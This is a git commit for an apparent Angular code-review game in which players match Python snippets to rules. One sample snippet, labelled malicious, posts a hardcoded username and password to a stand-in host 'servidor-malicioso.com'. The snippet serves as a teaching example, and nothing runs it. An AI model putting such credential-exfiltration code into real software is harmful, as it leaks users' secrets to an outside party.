4b8538dfc0f2058e89778a0c7c328ca7631a0277
pedro <pedrosteinmacher@gmail.com>
2023-06-26 17:46:28 -0300

    demo inicial

--- src/app/app.component.ts
+++ src/app/app.component.ts
@@ -1,4 +1,5 @@
 import { Component } from '@angular/core';
+import { Codigo } from './interfaces/codigo';
 
 @Component({
   selector: 'app-root',
@@ -6,5 +7,61 @@ import { Component } from '@angular/core';
   styleUrls: ['./app.component.scss']
 })
 export class AppComponent {
-  title = 'commitjogo';
+  erro = {
+    codigoMalicioso : "codigoMalicioso",
+    nomenclaturaErrada : "nomenclaturaErrada",
+    none : ''
+  }
+
+  regras = [
+    {
+      regra : 'Não pode ter codigo malicioso',
+      error : this.erro.codigoMalicioso
+    }
+  ]
+
+  codigo = [
+    {
+      function : `def enviar_dados_sensiveis():
+      dados = {
+          'usuario': 'admin',
+          'senha': '123456'
+      }
+      response = requests.post('http://www.servidor-malicioso.com', data=dados)`,
+      error : this.erro.codigoMalicioso
+    },
+    {
+      function : `def calcular_soma(lista):
+      soma = 0
+      for elemento in lista:
+          soma += elemento
+      return soma`,
+      error : this.erro.none
+    }
+  ]
+
+  codigoSelecionado : any
+  regraSelecionada : any
+
+  codigoSelected(code: any) {
+    this.codigoSelecionado = code
+    this.compare()
+  }
+  
+  regraSelected(regra: any) {
+    this.regraSelecionada = regra
+    this.compare()
+  }
+
+  async compare() {
+    if(this.codigoSelecionado == null || this.regraSelecionada == null) return
+    if(this.codigoSelecionado.error == this.regraSelecionada.error) {
+      console.log("achou um erro")
+    }else {
+      console.log("Tudo certo por aqui!")
+    }
+    await new Promise(resolve => setTimeout(resolve, 300));
+    this.codigoSelecionado = null
+    this.regraSelecionada = null
+  }
 }
---
+++ src/app/interfaces/codigo.ts
@@ -0,0 +1,5 @@
+export interface Codigo {
+    function : String
+    error : String
+    
+}
